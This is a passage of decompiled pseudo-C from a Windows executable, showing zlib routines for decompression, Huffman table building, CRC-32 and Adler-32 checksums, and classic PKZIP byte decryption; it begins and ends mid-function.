switchD_00404408_caseD_4046b8:
      if (puVar5[2] < (puVar5[1] >> 10) + 4) {
        do {
          for (; param_2 < (byte *)0x3; param_2 = (byte **)((int)param_2 + 8)) {
            if (local_8 == (byte *)0x0) goto LAB_00404a58;
            param_3 = (byte *)0x0;
            local_8 = local_8 + -1;
            param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
            _Src = _Src + 1;
          }
          uVar9 = (uint)param_1 & 7;
          param_2 = (byte **)((int)param_2 + -3);
          param_1 = (uint *)((uint)param_1 >> 3);
          *(uint *)(puVar5[3] + *(int *)(&DAT_0040cdf0 + puVar5[2] * 4) * 4) = uVar9;
          puVar5[2] = puVar5[2] + 1;
        } while (puVar5[2] < (puVar5[1] >> 10) + 4);
      }
      while (puVar5[2] < 0x13) {
        *(undefined4 *)(puVar5[3] + *(int *)(&DAT_0040cdf0 + puVar5[2] * 4) * 4) = 0;
        puVar5[2] = puVar5[2] + 1;
      }
      puVar5[4] = 7;
      local_10 = (byte *)FUN_00404fa0(puVar5[3],puVar5 + 4,puVar5 + 5,puVar5[9],ppbVar6);
      if (local_10 == (byte *)0x0) {
        puVar5[2] = 0;
        *puVar5 = 5;
        goto switchD_00404408_caseD_40476e;
      }
      goto LAB_00404ae0;
    case (undefined *)0x40476e:
switchD_00404408_caseD_40476e:
      while (puVar5[2] < (puVar5[1] >> 5 & 0x1f) + 0x102 + (puVar5[1] & 0x1f)) {
        for (; param_2 < (byte *)puVar5[4]; param_2 = (byte **)((int)param_2 + 8)) {
          if (local_8 == (byte *)0x0) goto LAB_00404a58;
          param_3 = (byte *)0x0;
          local_8 = local_8 + -1;
          param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
          _Src = _Src + 1;
        }
        local_18 = *(uint *)(puVar5[5] + 4 +
                            (*(uint *)(&DAT_0040bca8 + (int)(byte *)puVar5[4] * 4) & (uint)param_1)
                            * 8);
        bVar2 = *(byte *)(puVar5[5] +
                          (*(uint *)(&DAT_0040bca8 + (int)(byte *)puVar5[4] * 4) & (uint)param_1) *
                          8 + 1);
        local_10 = (byte *)(uint)bVar2;
        if (local_18 < 0x10) {
          param_1 = (uint *)((uint)param_1 >> (bVar2 & 0x1f));
          param_2 = (byte **)((int)param_2 + -(int)local_10);
          *(uint *)(puVar5[3] + puVar5[2] * 4) = local_18;
          puVar5[2] = puVar5[2] + 1;
        }
        else {
          if (local_18 == 0x12) {
            iVar7 = 7;
          }
          else {
            iVar7 = local_18 - 0xe;
          }
          local_14 = (byte *)(((local_18 != 0x12) - 1 & 8) + 3);
          for (; param_2 < local_10 + iVar7; param_2 = (byte **)((int)param_2 + 8)) {
            if (local_8 == (byte *)0x0) goto LAB_00404a58;
            param_3 = (byte *)0x0;
            local_8 = local_8 + -1;
            param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
            _Src = _Src + 1;
          }
          uVar9 = (uint)param_1 >> (bVar2 & 0x1f);
          local_14 = local_14 + (*(uint *)(&DAT_0040bca8 + iVar7 * 4) & uVar9);
          param_1 = (uint *)(uVar9 >> ((byte)iVar7 & 0x1f));
          uVar9 = puVar5[2];
          param_2 = (byte **)((int)param_2 + -(int)(local_10 + iVar7));
          if ((byte *)((puVar5[1] >> 5 & 0x1f) + 0x102 + (puVar5[1] & 0x1f)) < local_14 + uVar9) {
LAB_00404a94:
            (*(code *)ppbVar6[9])(ppbVar6[10],puVar5[3]);
            *puVar5 = 9;
            ppbVar6[6] = (byte *)s_invalid_bit_length_repeat_0040f64c;
            puVar5[8] = (uint)param_1;
            puVar5[7] = (uint)param_2;
            ppbVar6[1] = local_8;
            pbVar4 = *ppbVar6;
            *ppbVar6 = _Src;
            ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
            puVar5[0xd] = (uint)local_c;
            FUN_00403bd6(puVar5,ppbVar6,0xfffffffd);
            return;
          }
          if (local_18 == 0x10) {
            if (uVar9 == 0) goto LAB_00404a94;
            uVar8 = *(undefined4 *)((puVar5[3] - 4) + uVar9 * 4);
          }
          else {
            uVar8 = 0;
          }
          do {
            *(undefined4 *)(puVar5[3] + uVar9 * 4) = uVar8;
            uVar9 = uVar9 + 1;
            local_14 = local_14 + -1;
          } while (local_14 != (byte *)0x0);
          puVar5[2] = uVar9;
        }
      }
      puVar5[5] = 0;
      local_18 = 9;
      local_14 = (byte *)0x6;
      local_10 = (byte *)FUN_0040501f((puVar5[1] & 0x1f) + 0x101,(puVar5[1] >> 5 & 0x1f) + 1,
                                      puVar5[3],&local_18,&local_14,&local_30,&local_2c,puVar5[9],
                                      ppbVar6);
      if (local_10 == (byte *)0x0) {
        uVar9 = FUN_00403cc8(local_18,local_14,local_30,local_2c,ppbVar6);
        if (uVar9 == 0) goto LAB_00404b1c;
        puVar5[1] = uVar9;
        (*(code *)ppbVar6[9])(ppbVar6[10],puVar5[3]);
        *puVar5 = 6;
        goto switchD_00404408_caseD_404935;
      }
LAB_00404ae0:
      if (local_10 == (byte *)0xfffffffd) {
        (*(code *)ppbVar6[9])(ppbVar6[10],puVar5[3]);
        *puVar5 = 9;
      }
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      ppbVar6[1] = local_8;
      pbVar4 = *ppbVar6;
      *ppbVar6 = _Src;
      ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
      puVar5[0xd] = (uint)local_c;
      param_3 = local_10;
      goto LAB_004049e5;
    case (undefined *)0x404935:
switchD_00404408_caseD_404935:
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      ppbVar6[1] = local_8;
      pbVar4 = *ppbVar6;
      *ppbVar6 = _Src;
      ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
      puVar5[0xd] = (uint)local_c;
      param_3 = (byte *)FUN_00403cfc(puVar5,ppbVar6,param_3);
      if (param_3 != (byte *)0x1) goto LAB_004049e5;
      param_3 = (byte *)0x0;
      FUN_004042af(puVar5[1],ppbVar6);
      local_8 = ppbVar6[1];
      _Src = *ppbVar6;
      param_1 = (uint *)puVar5[8];
      param_2 = (byte **)puVar5[7];
      local_c = (byte *)puVar5[0xd];
      if (local_c < (byte *)puVar5[0xc]) {
        local_14 = (byte *)puVar5[0xc] + (-1 - (int)local_c);
      }
      else {
        local_14 = (byte *)(puVar5[0xb] - (int)local_c);
      }
      if (puVar5[6] != 0) {
        *puVar5 = 7;
        goto switchD_00404408_caseD_404b4a;
      }
      *puVar5 = 0;
      break;
    case (undefined *)0x404a1f:
switchD_00404408_caseD_404a1f:
      puVar5[8] = (uint)param_1;
LAB_00404a28:
      puVar5[7] = (uint)param_2;
      ppbVar6[1] = local_8;
      pbVar4 = *ppbVar6;
      *ppbVar6 = _Src;
      param_3 = (byte *)0xfffffffd;
      ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
      puVar5[0xd] = (uint)local_c;
      goto LAB_004049e5;
    case (undefined *)0x404b4a:
switchD_00404408_caseD_404b4a:
      puVar5[0xd] = (uint)local_c;
      param_3 = (byte *)FUN_00403bd6(puVar5,ppbVar6,param_3);
      local_c = (byte *)puVar5[0xd];
      if ((byte *)puVar5[0xc] == local_c) {
        *puVar5 = 8;
        goto switchD_00404408_caseD_404b95;
      }
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      ppbVar6[1] = local_8;
      pbVar4 = *ppbVar6;
      *ppbVar6 = _Src;
      ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
      puVar5[0xd] = (uint)local_c;
      goto LAB_004049e5;
    case (undefined *)0x404b95:
switchD_00404408_caseD_404b95:
      param_3 = (byte *)0x1;
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      ppbVar6[1] = local_8;
      pbVar4 = *ppbVar6;
      *ppbVar6 = _Src;
      ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
      puVar5[0xd] = (uint)local_c;
      goto LAB_004049e5;
    }
    uVar9 = *puVar5;
  }
  param_3 = (byte *)0xfffffffe;
  puVar5[8] = (uint)param_1;
  puVar5[7] = (uint)param_2;
  ppbVar6[1] = local_8;
  pbVar4 = *ppbVar6;
  *ppbVar6 = _Src;
  ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
  puVar5[0xd] = (uint)local_c;
LAB_004049e5:
  FUN_00403bd6(puVar5,ppbVar6,param_3);
  return;
}



undefined4 FUN_00404be5(int param_1,int param_2)

{
  FUN_004042c0(param_1,param_2,0);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),*(undefined4 *)(param_1 + 0x28));
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),*(undefined4 *)(param_1 + 0x24));
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return 0;
}



// WARNING: Could not reconcile some variable overlaps

undefined4
FUN_00404c19(int *param_1,uint param_2,uint param_3,int param_4,int param_5,int *param_6,
            uint *param_7,int param_8,uint *param_9,uint *param_10)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  uint *puVar5;
  int *piVar6;
  int iVar7;
  uint uVar8;
  byte bVar9;
  uint uVar10;
  uint *puVar11;
  int local_f4 [15];
  uint local_b8 [16];
  uint local_78 [19];
  undefined4 local_2c;
  uint local_28;
  uint *local_24;
  int local_20;
  uint local_1c;
  uint local_18;
  uint *local_14;
  uint local_10;
  int local_c;
  uint local_8;
  
  puVar5 = param_7;
  local_78[0] = 0;
  local_78[1] = 0;
  local_78[2] = 0;
  local_78[3] = 0;
  local_78[4] = 0;
  local_78[5] = 0;
  local_78[6] = 0;
  local_78[7] = 0;
  local_78[8] = 0;
  local_78[9] = 0;
  local_78[10] = 0;
  local_78[11] = 0;
  local_78[12] = 0;
  local_78[13] = 0;
  local_78[14] = 0;
  local_78[15] = 0;
  piVar6 = param_1;
  uVar10 = param_2;
  do {
    iVar2 = *piVar6;
    piVar6 = piVar6 + 1;
    local_78[iVar2] = local_78[iVar2] + 1;
    uVar10 = uVar10 - 1;
  } while (uVar10 != 0);
  if (local_78[0] == param_2) {
    *param_6 = 0;
    *param_7 = 0;
  }
  else {
    uVar10 = 1;
    puVar11 = local_78;
    param_7 = (uint *)*param_7;
    do {
      puVar11 = puVar11 + 1;
      if (*puVar11 != 0) break;
      uVar10 = uVar10 + 1;
    } while (uVar10 < 0x10);
    local_8 = uVar10;
    if (param_7 < uVar10) {
      param_7 = (uint *)uVar10;
    }
    puVar11 = local_78 + 0xf;
    uVar1 = 0xf;
    do {
      if (*puVar11 != 0) break;
      uVar1 = uVar1 - 1;
      puVar11 = puVar11 + -1;
    } while (uVar1 != 0);
    local_1c = uVar1;
    if (uVar1 < param_7) {
      param_7 = (uint *)uVar1;
    }
    local_78[17] = 1 << ((byte)uVar10 & 0x1f);
    *puVar5 = (uint)param_7;
    if (uVar10 < uVar1) {
      puVar5 = local_78 + uVar10;
      do {
        uVar8 = *puVar5;
        if ((int)(local_78[17] - uVar8) < 0) {
          return 0xfffffffd;
        }
        uVar10 = uVar10 + 1;
        puVar5 = puVar5 + 1;
        local_78[17] = (local_78[17] - uVar8) * 2;
      } while (uVar10 < uVar1);
    }
    local_78[17] = local_78[17] - local_78[uVar1];
    if ((int)local_78[17] < 0) {
      return 0xfffffffd;
    }
    local_b8[1] = 0;
    local_78[uVar1] = local_78[uVar1] + local_78[17];
    iVar7 = 0;
    iVar2 = uVar1 - 1;
    if (iVar2 != 0) {
      iVar3 = 0;
      do {
        iVar7 = iVar7 + *(int *)((int)local_78 + iVar3 + 4);
        iVar2 = iVar2 + -1;
        *(int *)((int)local_b8 + iVar3 + 8) = iVar7;
        iVar3 = iVar3 + 4;
      } while (iVar2 != 0);
    }
    uVar10 = 0;
    do {
      iVar2 = *param_1;
      param_1 = param_1 + 1;
      if (iVar2 != 0) {
        uVar8 = local_b8[iVar2];
        param_10[uVar8] = uVar10;
        local_b8[iVar2] = uVar8 + 1;
      }
      uVar10 = uVar10 + 1;
    } while (uVar10 < param_2);
    uVar10 = local_b8[uVar1];
    local_c = -1;
    local_10 = 0;
    local_14 = param_10;
    iVar2 = -(int)param_7;
    local_b8[0] = 0;
    local_f4[0] = 0;
    local_20 = 0;
    param_1 = (int *)0x0;
    if ((int)local_8 <= (int)local_1c) {
      local_78[18] = local_8 - 1;
      local_24 = local_78 + local_8;
      do {
        uVar1 = *local_24;
        local_18 = uVar1 - 1;
        while (uVar1 != 0) {
          local_2c._2_2_ = (undefined2)(local_2c >> 0x10);
          local_78[16] = (int)param_7 + iVar2;
          if ((int)local_78[16] < (int)local_8) {
            do {
              iVar7 = local_c;
              local_c = local_c + 1;
              iVar2 = iVar2 + (int)param_7;
              local_78[16] = local_78[16] + (int)param_7;
              param_1 = (int *)(local_1c - iVar2);
              if (param_7 < param_1) {
                param_1 = (int *)param_7;
              }
              uVar8 = local_8 - iVar2;
              uVar1 = 1 << ((byte)uVar8 & 0x1f);
              if ((local_18 + 1 < uVar1) &&
                 (iVar3 = uVar1 + (-1 - local_18), puVar5 = local_24, uVar8 < param_1)) {
                while (uVar8 = uVar8 + 1, uVar8 < param_1) {
                  uVar1 = puVar5[1];
                  puVar5 = puVar5 + 1;
                  uVar4 = iVar3 * 2;
                  if (uVar4 < uVar1 || uVar4 - uVar1 == 0) break;
                  iVar3 = uVar4 - uVar1;
                }
              }
              param_1 = (int *)(1 << ((byte)uVar8 & 0x1f));
              uVar1 = *param_9 + (int)param_1;
              if (0x5a0 < uVar1) {
                return 0xfffffffd;
              }
              local_20 = param_8 + *param_9 * 8;
              local_f4[local_c] = local_20;
              uVar4 = local_10;
              iVar3 = local_20;
              *param_9 = uVar1;
              if (local_c == 0) {
                *param_6 = local_20;
              }
              else {
                local_b8[local_c] = local_10;
                local_2c = local_2c & 0xffff0000 | (uint)CONCAT11((char)param_7,(byte)uVar8);
                uVar4 = uVar4 >> ((char)iVar2 - (char)param_7 & 0x1fU);
                iVar7 = local_f4[iVar7];
                local_28 = (iVar3 - iVar7 >> 3) - uVar4;
                *(uint *)(iVar7 + uVar4 * 8) = local_2c;
                *(uint *)(iVar7 + 4 + uVar4 * 8) = local_28;
              }
            } while ((int)local_78[16] < (int)local_8);
          }
          uVar1 = local_18;
          bVar9 = (byte)iVar2;
          if (local_14 < param_10 + uVar10) {
            local_28 = *local_14;
            if (local_28 < param_3) {
              local_2c._0_1_ = (-(local_28 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar7 = (local_28 - param_3) * 4;
              local_2c._0_1_ = *(char *)(iVar7 + param_5) + 'P';
              local_28 = *(uint *)(iVar7 + param_4);
            }
            local_14 = local_14 + 1;
          }
          else {
            local_2c._0_1_ = -0x40;
          }
          local_2c = CONCAT31(CONCAT21(local_2c._2_2_,(char)local_8 - bVar9),(char)local_2c);
          iVar7 = 1 << ((char)local_8 - bVar9 & 0x1f);
          uVar8 = local_10 >> (bVar9 & 0x1f);
          if (uVar8 < param_1) {
            puVar5 = (uint *)(local_20 + uVar8 * 8);
            do {
              uVar8 = uVar8 + iVar7;
              *puVar5 = local_2c;
              puVar5[1] = local_28;
              puVar5 = puVar5 + iVar7 * 2;
            } while (uVar8 < param_1);
          }
          uVar8 = 1 << ((byte)local_78[18] & 0x1f);
          while ((local_10 & uVar8) != 0) {
            local_10 = local_10 ^ uVar8;
            uVar8 = uVar8 >> 1;
          }
          local_10 = local_10 ^ uVar8;
          for (puVar5 = local_b8 + local_c; ((1 << ((byte)iVar2 & 0x1f)) - 1U & local_10) != *puVar5
              ; puVar5 = puVar5 + -1) {
            local_c = local_c + -1;
            iVar2 = iVar2 - (int)param_7;
          }
          local_18 = local_18 - 1;
        }
        local_8 = local_8 + 1;
        local_24 = local_24 + 1;
        local_78[18] = local_78[18] + 1;
      } while ((int)local_8 <= (int)local_1c);
    }
    if ((local_78[17] != 0) && (local_1c != 1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}



int FUN_00404fa0(undefined4 param_1,int *param_2,undefined4 param_3,undefined4 param_4,int param_5)

{
  int iVar1;
  int iVar2;
  undefined4 local_8;
  
  local_8 = 0;
  iVar1 = (**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),0x13,4);
  if (iVar1 == 0) {
    iVar2 = -4;
  }
  else {
    iVar2 = FUN_00404c19(param_1,0x13,0x13,0,0,param_3,param_2,param_4,&local_8,iVar1);
    if (iVar2 == -3) {
      *(char **)(param_5 + 0x18) = s_oversubscribed_dynamic_bit_lengt_0040f6e4;
    }
    else if ((iVar2 == -5) || (*param_2 == 0)) {
      *(char **)(param_5 + 0x18) = s_incomplete_dynamic_bit_lengths_t_0040f6c0;
      iVar2 = -3;
    }
    (**(code **)(param_5 + 0x24))(*(undefined4 *)(param_5 + 0x28),iVar1);
  }
  return iVar2;
}



int FUN_0040501f(uint param_1,undefined4 param_2,int param_3,int *param_4,int *param_5,
                undefined4 param_6,undefined4 param_7,undefined4 param_8,int param_9)

{
  int iVar1;
  int iVar2;
  undefined4 local_8;
  
  local_8 = 0;
  iVar1 = (**(code **)(param_9 + 0x20))(*(undefined4 *)(param_9 + 0x28),0x120,4);
  if (iVar1 == 0) {
    return -4;
  }
  iVar2 = FUN_00404c19(param_3,param_1,0x101,&DAT_0040ce6c,&DAT_0040cee8,param_6,param_4,param_8,
                       &local_8,iVar1);
  if (iVar2 == 0) {
    if (*param_4 == 0) goto LAB_00405104;
    iVar2 = FUN_00404c19(param_3 + param_1 * 4,param_2,0,&DAT_0040cf64,&DAT_0040cfdc,param_7,param_5
                         ,param_8,&local_8,iVar1);
    if (iVar2 == 0) {
      if ((*param_5 != 0) || (param_1 < 0x102)) {
        iVar2 = 0;
        goto LAB_00405110;
      }
LAB_004050e8:
      *(char **)(param_9 + 0x18) = s_empty_distance_tree_with_lengths_0040f750;
    }
    else {
      if (iVar2 == -3) {
        *(char **)(param_9 + 0x18) = s_oversubscribed_distance_tree_0040f790;
        goto LAB_00405110;
      }
      if (iVar2 != -5) {
        if (iVar2 == -4) goto LAB_00405110;
        goto LAB_004050e8;
      }
      *(char **)(param_9 + 0x18) = s_incomplete_distance_tree_0040f774;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(param_9 + 0x18) = s_oversubscribed_literal_length_tr_0040f72c;
      goto LAB_00405110;
    }
    if (iVar2 == -4) goto LAB_00405110;
LAB_00405104:
    *(char **)(param_9 + 0x18) = s_incomplete_literal_length_tree_0040f70c;
  }
  iVar2 = -3;
LAB_00405110:
  (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),iVar1);
  return iVar2;
}



undefined4
FUN_00405122(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4)

{
  *param_1 = 9;
  *param_2 = 5;
  *param_3 = &DAT_0040bcf0;
  *param_4 = &DAT_0040ccf0;
  return 0;
}



undefined4 FUN_0040514d(int param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte bVar1;
  uint uVar2;
  byte **ppbVar3;
  int iVar4;
  byte *pbVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  byte *pbVar12;
  undefined4 uStack44;
  byte *local_14;
  byte *local_10;
  byte *local_c;
  byte *local_8;
  
  ppbVar3 = param_6;
  local_10 = *(byte **)(param_5 + 0x34);
  uVar9 = *(uint *)(param_5 + 0x1c);
  local_c = *param_6;
  local_8 = param_6[1];
  param_6 = *(byte ***)(param_5 + 0x20);
  if (local_10 < *(byte **)(param_5 + 0x30)) {
    local_14 = *(byte **)(param_5 + 0x30) + (-1 - (int)local_10);
  }
  else {
    local_14 = (byte *)(*(int *)(param_5 + 0x2c) - (int)local_10);
  }
  uVar8 = *(uint *)(&DAT_0040bca8 + param_1 * 4);
  uVar2 = *(uint *)(&DAT_0040bca8 + param_2 * 4);
  do {
    for (; uVar9 < 0x14; uVar9 = uVar9 + 8) {
      local_8 = local_8 + -1;
      param_6 = (byte **)((uint)param_6 | (uint)*local_c << ((byte)uVar9 & 0x1f));
      local_c = local_c + 1;
    }
    pbVar12 = (byte *)(param_3 + (uVar8 & (uint)param_6) * 8);
    bVar1 = *pbVar12;
LAB_004051d5:
    uVar6 = (uint)bVar1;
    if (uVar6 != 0) {
      param_6 = (byte **)((uint)param_6 >> (pbVar12[1] & 0x1f));
      uVar9 = uVar9 - pbVar12[1];
      if ((bVar1 & 0x10) != 0) {
        uVar6 = uVar6 & 0xf;
        uVar10 = *(uint *)(&DAT_0040bca8 + uVar6 * 4) & (uint)param_6;
        param_6 = (byte **)((uint)param_6 >> (sbyte)uVar6);
        uVar10 = uVar10 + *(int *)(pbVar12 + 4);
        for (uVar9 = uVar9 - uVar6; uVar9 < 0xf; uVar9 = uVar9 + 8) {
          local_8 = local_8 + -1;
          param_6 = (byte **)((uint)param_6 | (uint)*local_c << ((byte)uVar9 & 0x1f));
          local_c = local_c + 1;
        }
        uVar6 = uVar2 & (uint)param_6;
        iVar4 = param_4 + uVar6 * 8;
        param_6 = (byte **)((uint)param_6 >> (*(byte *)(iVar4 + 1) & 0x1f));
        uVar9 = uVar9 - *(byte *)(iVar4 + 1);
        bVar1 = *(byte *)(param_4 + uVar6 * 8);
        while ((bVar1 & 0x10) == 0) {
          if ((bVar1 & 0x40) != 0) {
            ppbVar3[6] = (byte *)s_invalid_distance_code_0040f618;
            uVar8 = (int)ppbVar3[1] - (int)local_8;
            if (uVar9 >> 3 < (uint)((int)ppbVar3[1] - (int)local_8)) {
              uVar8 = uVar9 >> 3;
            }
            uStack44 = 0xfffffffd;
            goto LAB_004053ed;
          }
          iVar7 = (*(uint *)(&DAT_0040bca8 + (uint)bVar1 * 4) & (uint)param_6) + *(int *)(iVar4 + 4)
          ;
          pbVar12 = (byte *)(iVar4 + iVar7 * 8);
          iVar4 = iVar4 + iVar7 * 8;
          param_6 = (byte **)((uint)param_6 >> (*(byte *)(iVar4 + 1) & 0x1f));
          uVar9 = uVar9 - *(byte *)(iVar4 + 1);
          bVar1 = *pbVar12;
        }
        uVar6 = bVar1 & 0xf;
        for (; uVar9 < uVar6; uVar9 = uVar9 + 8) {
          local_8 = local_8 + -1;
          param_6 = (byte **)((uint)param_6 | (uint)*local_c << ((byte)uVar9 & 0x1f));
          local_c = local_c + 1;
        }
        uVar11 = *(uint *)(&DAT_0040bca8 + uVar6 * 4) & (uint)param_6;
        uVar9 = uVar9 - uVar6;
        param_6 = (byte **)((uint)param_6 >> (sbyte)uVar6);
        local_14 = local_14 + -uVar10;
        pbVar5 = local_10 + -(uVar11 + *(int *)(iVar4 + 4));
        pbVar12 = *(byte **)(param_5 + 0x28);
        if (pbVar5 < pbVar12) {
          do {
            pbVar5 = pbVar5 + (*(int *)(param_5 + 0x2c) - (int)pbVar12);
          } while (pbVar5 < pbVar12);
          uVar6 = *(int *)(param_5 + 0x2c) - (int)pbVar5;
          if (uVar6 < uVar10) {
            param_1 = uVar10 - uVar6;
            do {
              *local_10 = *pbVar5;
              local_10 = local_10 + 1;
              pbVar5 = pbVar5 + 1;
              uVar6 = uVar6 - 1;
            } while (uVar6 != 0);
            pbVar12 = *(byte **)(param_5 + 0x28);
            do {
              *local_10 = *pbVar12;
              local_10 = local_10 + 1;
              pbVar12 = pbVar12 + 1;
              param_1 = param_1 + -1;
            } while (param_1 != 0);
          }
          else {
            *local_10 = *pbVar5;
            local_10[1] = pbVar5[1];
            local_10 = local_10 + 2;
            pbVar5 = pbVar5 + 2;
            param_1 = uVar10 - 2;
            do {
              *local_10 = *pbVar5;
              local_10 = local_10 + 1;
              pbVar5 = pbVar5 + 1;
              param_1 = param_1 + -1;
            } while (param_1 != 0);
          }
        }
        else {
          *local_10 = *pbVar5;
          local_10[1] = pbVar5[1];
          local_10 = local_10 + 2;
          pbVar5 = pbVar5 + 2;
          param_1 = uVar10 - 2;
          do {
            *local_10 = *pbVar5;
            local_10 = local_10 + 1;
            pbVar5 = pbVar5 + 1;
            param_1 = param_1 + -1;
          } while (param_1 != 0);
        }
        goto LAB_0040536f;
      }
      if ((bVar1 & 0x40) == 0) break;
      if ((bVar1 & 0x20) == 0) {
        ppbVar3[6] = (byte *)s_invalid_literal_length_code_0040f630;
        uVar8 = (int)ppbVar3[1] - (int)local_8;
        if (uVar9 >> 3 < (uint)((int)ppbVar3[1] - (int)local_8)) {
          uVar8 = uVar9 >> 3;
        }
        uStack44 = 0xfffffffd;
      }
      else {
        uVar8 = (int)ppbVar3[1] - (int)local_8;
        if (uVar9 >> 3 < (uint)((int)ppbVar3[1] - (int)local_8)) {
          uVar8 = uVar9 >> 3;
        }
        uStack44 = 1;
      }
      goto LAB_004053ed;
    }
    param_6 = (byte **)((uint)param_6 >> (pbVar12[1] & 0x1f));
    uVar9 = uVar9 - pbVar12[1];
    local_14 = local_14 + -1;
    *local_10 = pbVar12[4];
    local_10 = local_10 + 1;
LAB_0040536f:
    if ((local_14 < (byte *)0x102) || (local_8 < (byte *)0xa)) {
      uVar8 = (int)ppbVar3[1] - (int)local_8;
      if (uVar9 >> 3 < (uint)((int)ppbVar3[1] - (int)local_8)) {
        uVar8 = uVar9 >> 3;
      }
      uStack44 = 0;
LAB_004053ed:
      *(byte ***)(param_5 + 0x20) = param_6;
      *(uint *)(param_5 + 0x1c) = uVar9 + uVar8 * -8;
      ppbVar3[1] = local_8 + uVar8;
      pbVar12 = *ppbVar3;
      *ppbVar3 = local_c + -uVar8;
      ppbVar3[2] = ppbVar3[2] + ((int)(local_c + -uVar8) - (int)pbVar12);
      *(byte **)(param_5 + 0x34) = local_10;
      return uStack44;
    }
  } while( true );
  pbVar12 = pbVar12 + ((*(uint *)(&DAT_0040bca8 + uVar6 * 4) & (uint)param_6) +
                      *(int *)(pbVar12 + 4)) * 8;
  bVar1 = *pbVar12;
  goto LAB_004051d5;
}



uint FUN_0040541f(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  
  if (param_2 == (byte *)0x0) {
    return 0;
  }
  param_1 = ~param_1;
  if (7 < param_3) {
    uVar2 = param_3 >> 3;
    do {
      param_3 = param_3 - 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (param_1 & 0xff ^ (uint)*param_2) * 4) ^ param_1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[1]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[2]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[3]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[4]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[5]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[6]) * 4) ^ uVar1 >> 8;
      param_1 = uVar1 >> 8 ^ *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[7]) * 4);
      param_2 = param_2 + 8;
      uVar2 = uVar2 - 1;
    } while (uVar2 != 0);
  }
  for (; param_3 != 0; param_3 = param_3 - 1) {
    param_1 = param_1 >> 8 ^ *(uint *)(&DAT_0040d054 + (param_1 & 0xff ^ (uint)*param_2) * 4);
    param_2 = param_2 + 1;
  }
  return ~param_1;
}



void FUN_00405535(uint *param_1,byte param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0040d054 + (*param_1 & 0xff ^ (uint)param_2) * 4) ^ *param_1 >> 8;
  *param_1 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_1[1]) * 0x8088405 + 1;
  param_1[1] = uVar1;
  param_1[2] = *(uint *)(&DAT_0040d054 + (uVar1 >> 0x18 ^ param_1[2] & 0xff) * 4) ^ param_1[2] >> 8;
  return;
}



uint FUN_00405588(int param_1)

{
  uint uVar1;
  
  uVar1 = *(uint *)(param_1 + 8) & 0xfffd | 2;
  return (uVar1 ^ 1) * uVar1 >> 8 & 0xff;
}



byte FUN_004055a3(undefined4 param_1,uint param_2)

{
  byte bVar1;
  
  bVar1 = FUN_00405588(param_1);
  param_2 = param_2 & 0xffffff00 | (uint)((byte)param_2 ^ bVar1);
  FUN_00405535(param_1,param_2);
  return (byte)param_2 ^ bVar1;
}



uint FUN_004055c4(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  
  uVar3 = param_1 & 0xffff;
  param_1 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    uVar3 = 1;
  }
  else {
    if (param_3 != 0) {
      do {
        uVar2 = 0x15b0;
        if (param_3 < 0x15b0) {
          uVar2 = param_3;
        }
        param_3 = param_3 - uVar2;
        if (0xf < (int)uVar2) {
          uVar1 = uVar2 >> 4;
          uVar2 = uVar2 + uVar1 * -0x10;
          do {
            iVar4 = uVar3 + *param_2;
            iVar5 = iVar4 + (uint)param_2[1];
            iVar6 = iVar5 + (uint)param_2[2];
            iVar7 = iVar6 + (uint)param_2[3];
            iVar8 = iVar7 + (uint)param_2[4];
            iVar9 = iVar8 + (uint)param_2[5];
